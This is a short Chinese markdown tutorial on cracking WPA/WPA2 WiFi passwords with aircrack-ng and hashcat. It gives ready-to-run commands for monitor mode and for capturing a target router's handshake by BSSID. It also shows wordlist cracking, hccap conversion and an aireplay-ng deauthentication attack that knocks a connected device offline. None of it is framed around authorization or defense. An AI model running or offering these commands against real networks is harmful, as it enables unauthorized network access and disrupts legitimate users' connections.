# 配置网卡

- WM Ware(开机后)

    虚拟机->可移动设备->Ralink 802.11 n Wlan(显卡型号)->连接(断开与主机的连接)

- VBox

    虚拟机关机状态下->将设备插入主机->设置->USB设备->添加->删除除了供应商标识(VendorID)和产品标识(ProductID)之外的参数->开机->插入设备

- 验证是否连接成功

    ```bash
    lsusb
    airmon-ng
    ifconfig
    ```
    出现无线网卡型号即为成功



# 基础命令












# 简单示例

- 以无线网卡名为wlan0举例

    - `启动网卡`

        airmon-ng start wlan0

    - `关闭干扰程序`

        airmon-ng check kill

    - `开启抓包`

        airodump-ng wlan0mon

    - `指定特定的wifi抓握手包`

        airodump-ng -c 6 --bssid E0:24:81:AF:F3:A8 -w wireless wlan0mon

            -c 指定信道,上面已经标记目标热点的信道(CH)
            -bssid 指定目标路由器的BSSID,就是上面标记的BSSID
            -w 指定抓取的数据包保存的目录

            出现handshake则抓包成功

    - `跑包`

        aircrack-ng -a2 -b E0:24:81:AF:F3:A8 -w pass.txt wireless-01.cap

- 使用hashcat爆破(只能跑WPA/WPA2/PSK加密的)

    - `用aircrack-ng把cap转换成hccap类型数据包(会自动添加后缀名.hccap)`

        aircrack-ng wireless-01.cap -J wireless

    - `用hashcat破解WPA/PSK密码`

        hashcat -m 2500 wireless.hccap pass.txt --force

    - `若是提示"Old hccap format detected! You need to update"可以将第一步的命令改为`

        aircrack-ng wireless-01.cap -j wireless

- 注意如果抓不到握手包把对方踢下线,这样就会抓包成功

    aireplay-ng -0 10 -a <无线路由器的MAC地址> -c <连接上的设备MAC地址> wlan0mon